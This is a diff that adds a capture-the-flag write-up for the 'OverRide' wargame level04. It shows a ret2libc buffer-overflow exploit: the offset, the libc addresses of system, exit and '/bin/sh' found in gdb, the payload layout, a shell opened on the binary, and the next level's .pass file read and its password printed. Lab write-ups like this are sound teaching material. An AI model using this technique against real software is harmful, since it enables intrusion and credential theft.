@@ -1,0 +1,30 @@
+# we notice that we can do a buffer overflow but we can't execute a shellcode if
+# it makes a call for a syscall execve.
+# so we have two choices : either we create our own shellcode and which opens
+# '/home/users/level05/.pass' or use ret2libc
+
+# buffer overflow offset = 156
+# let's use ret2libc. So we have to find the addresses of system, exit and a "/bin/sh" string
+# system
+gdb-peda$ info function system
+[...]
+0xf7e6aed0  system
+[...]
+# exit
+gdb-peda$ info function exit
+[...]
+0xf7e5eb70  exit
+[...]
+# '/bin/sh'
+find /bin/sh
+[...]
+libc : 0xf7f897ec ("/bin/sh")
+
+# payload
+("A" * 156) + system_address + exit_address + "/bin/sh"_address
+level04@OverRide:~$ cat /tmp/payload - | ./level04
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
